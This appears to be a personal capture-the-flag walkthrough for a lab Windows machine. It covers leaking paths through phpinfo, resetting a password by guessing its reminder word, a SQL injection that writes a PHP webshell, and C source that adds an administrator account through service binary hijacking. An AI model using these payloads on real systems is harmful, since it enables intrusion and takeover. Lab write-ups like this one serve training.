#box

*Created: 2/1/2026*

### Step 1

**Tags:** #phpinfo #PHP #Information-leak

**Command:**
```bash
curl -s http://192.168.137.127:45332/phpinfo.php | grep DOCUMENT_ROOT
```

*Port: 45332*

> 
> We discover that on port 45332 a `phpinfo.php` file is exposed. From there we discover a trove of information. First of all, we know that an user called `Jerren` exists since some variables refer to C:\Users\Jerren. Second, we know where the current website is hosted, which is `C:/xampp/htdocs`

---

### Step 2

**Tags:** #Crawling #Web-Enumeration #Credentials-Leak

**Command:**
```bash
# This step has no command in itself, it's simply necessary to reset the user password with user:
# jerren.devops
# keyword to reset: 
# paranoid
```

*Port: 33033 | 💎 GEM*

> 
> Once discovered those few information we find out that on port 33033 a website is shown. From there we find this Jerren name once again, namely `jerren.devops` as per its authentication name with the image of a cat. Inside the login page we find an option to restore the password and a `Reminder` option which usually is a keyword or a sentence to remember when a password reset is requested. The quote of Jerren is `Only the paranoid survive` . After trying the sentence and a few more options we discover that the keyword is `paranoid`, being able to reset the user's password.

---

### Step 3

**Tags:** #MySQL #SQLi #MySQL-INTO-OUTFILE

**Command:**
```sql
' union SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/xampp/htdocs/shell.php" -- - 
```

*Port: 33033*

> 
> Once authenticated, we discover that we can edit the profile of the user and at the end of the page we notice a `Request profile SLUG` option which is, in parenthesis shown as EXPERIMENTAL. This is usually a low hanging fruit. Inside of it we notice the presence of a page containing a textbox. On top of it a MySQL message which feels like a debug message. By prompting a really basic SQL injection `' 1=1 -- - `command we notice it's vulnerable to a SQLi. We opt to upload a webshell in the C:/xampp/htdocs previously discovered, gaining a reverse shell right afterward

---

### Step 4

**Tags:** #services #Service-Binary-Hijacking #Barracuda-Server #msfvenom

**Command:**
```c
// We could either craft a malicious executable that creates an admin user for us:

// malicious.c

#include <stdlib.h>

int main () 
{ 
	int i; 
	
	i = system ("net user magic auth /add"); 
	i = system ("net localgroup administrators magic /add"); 
	
	return 0; 
}
```

*Port: 8000 | 💎 GEM*

> 
> Once on the target machine, we discover that the Barracuda Server application is version 6.5. This version suffers from this [vulnerability](https://www.exploit-db.com/exploits/48789) that permits us to escalate the privileges by replacing the currently `bd.exe` (Barracuda Drive) executable with a malicious one. That replacement also require a system restart. But once done, it'll run the given executable as SYSTEM.

---

